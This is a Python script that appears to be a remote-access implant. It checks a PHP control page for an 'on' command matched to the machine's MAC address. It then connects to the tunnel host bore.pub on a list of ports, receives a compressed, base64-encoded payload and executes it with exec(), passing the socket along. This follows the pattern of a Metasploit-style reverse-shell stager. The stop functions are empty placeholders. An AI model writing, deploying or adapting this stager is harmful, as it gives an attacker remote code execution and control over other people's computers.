import requests
import subprocess
import platform
import socket
import re
import uuid
import time
import random
import struct
import zlib
import base64

# Function to get the current MAC address of the device
def get_mac_address():
    try:
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
        return mac
    except Exception as e:
        print(f"Error getting MAC address: {e}")
    return None

# Function to fetch data from the PHP page
def fetch_data_from_php(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            print(f"Failed to fetch data from {url}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error fetching data from {url}: {e}")
    return None

# Function to execute the script
def execute_script():
    try:
        # Your script code here
        while True:
            ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
            random.shuffle(ports_to_try)
    
            for port in ports_to_try:
                try:
                    s = socket.socket(2, socket.SOCK_STREAM)
                    s.connect(('bore.pub', port))
            
                    l = struct.unpack('>I', s.recv(4))[0]
                    d = s.recv(1)
                    while len(d) < l:
                        d += s.recv(l - len(d))

                    exec(zlib.decompress(base64.b64decode(d)), {'s': s})

                except Exception as e:
                    print(f"An error occurred: {e}")
                finally:
                    s.close()
        
                if 's' in locals():
                    break  # Break out of the loop if connection was successful
    
            print("Waiting for 5 seconds before retrying...")
            time.sleep(5)

    except KeyboardInterrupt:
        print("Script execution stopped by user.")

# Function to stop the script
def stop_script():
    # Your code to stop the script goes here
    print("Stopping the script...")

# Function to stop all scripts
def stop_all_scripts():
    # Your code to stop all scripts goes here
    print("Stopping all scripts...")

# Main function to process received data
def main():
    while True:  # Infinite loop
        current_mac_address = get_mac_address()
        if not current_mac_address:
            print("Unable to determine the current MAC address.")
            return

        php_url = "http://127.0.0.1:4477/Metasploit.php"  # Replace with the actual PHP page URL
        data_from_php = fetch_data_from_php(php_url)

        if data_from_php:
            lines = data_from_php.split('\n')
            mac_from_php = None
            option_from_php = None

            for line in lines:
                if line.startswith("MAC:"):
                    mac_from_php = line.split("MAC:")[1].strip()
                elif line.startswith("Option:"):
                    option_from_php = line.split("Option:")[1].strip()

            if mac_from_php == current_mac_address:
                if option_from_php.lower() == "on":
                    # Handle the "on" option
                    print("Received 'on' option. Performing action.")
                    execute_script()  # Execute the script when "on" is received

                elif option_from_php.lower() == "off":
                    # Handle the "off" option
                    print("Received 'off' option. Stopping action.")
                    stop_script()  # Stop the script when "off" is received

                elif option_from_php.lower() == "off all":
                    # Handle the "off all" option
                    print("Received 'off all' option. Stopping all actions.")
                    stop_all_scripts()  # Stop all scripts when "off all" is received

                else:
                    print("Received an unsupported option:", option_from_php)
            else:
                print("Received data is not for this device. Ignoring it.")
        else:
            print("No data received from the PHP page.")
            time.sleep(1)


if __name__ == '__main__':
    main()